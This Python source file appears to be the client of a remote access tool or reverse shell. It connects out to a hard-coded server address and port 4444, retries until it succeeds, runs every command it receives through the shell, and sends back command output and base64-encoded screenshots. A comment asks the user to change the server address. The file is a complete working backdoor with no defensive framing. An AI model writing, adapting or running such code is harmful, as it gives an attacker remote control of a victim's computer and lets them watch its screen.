import socket
import subprocess
import os
import base64
import time
import io

from utils import reliable_send, reliable_recv

# Screenshot support
try:
    from PIL import ImageGrab
except:
    ImageGrab = None

SERVER_IP = "10.223.63.55"   # 🔴 CHANGE THIS
SERVER_PORT = 4444


# -------------------- COMMAND EXECUTION --------------------

def execute_command(command):
    try:
        return subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT
        ).decode(errors="ignore")
    except Exception as e:
        return "Error: " + str(e)


def change_dir(path):
    try:
        os.chdir(path)
        return "[+] Changed directory to " + path
    except:
        return "[-] Failed to change directory"


def capture_screenshot():
    if ImageGrab is None:
        return None

    try:
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        encoded = base64.b64encode(buffer.getvalue()).decode()
        return encoded
    except:
        return None


# -------------------- CONNECTION --------------------

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connected to server")
            return sock
        except:
            print("[-] Connection failed, retrying...")
            time.sleep(5)


# -------------------- MAIN LOOP --------------------

def main():
    sock = connect()

    while True:
        try:
            command = reliable_recv(sock)

            if command == "exit":
                break

            elif command == "screenshot":
                image_data = capture_screenshot()
                if image_data:
                    reliable_send(sock, {"type": "image", "data": image_data})
                else:
                    reliable_send(sock, {"type": "text", "data": "Screenshot failed"})

            elif command.startswith("cd "):
                result = change_dir(command[3:])
                reliable_send(sock, {"type": "text", "data": result})

            else:
                result = execute_command(command)
                reliable_send(sock, {"type": "text", "data": result})

        except Exception as e:
            print("ERROR:", str(e))
            sock.close()
            sock = connect()

    sock.close()


# -------------------- RUN --------------------

main()
